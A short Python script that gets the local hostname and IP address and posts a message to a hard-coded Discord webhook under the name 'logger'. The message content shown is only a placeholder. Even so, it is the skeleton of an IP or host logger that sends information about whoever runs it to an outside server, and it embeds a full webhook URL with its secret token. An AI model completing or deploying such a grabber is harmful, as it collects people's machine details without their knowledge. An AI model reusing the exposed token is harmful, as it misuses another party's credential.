import socket
from discord_webhook import DiscordWebhook

host_name = socket.gethostname()
ip_address = socket.gethostbyname(host_name)

content = f"..."

webhook = DiscordWebhook(
    url="https://discord.com/api/webhooks/1310753317256695818/sCZYVUNfZu3QZKu7EV4epPwH4srTGkvTN9R9c8mw5Ze9P0S9xNivhGXGVTd2NsK9GSZS", 
    username="logger", 
    content=content
)

response = webhook.execute()
print("Webhook response:", response)
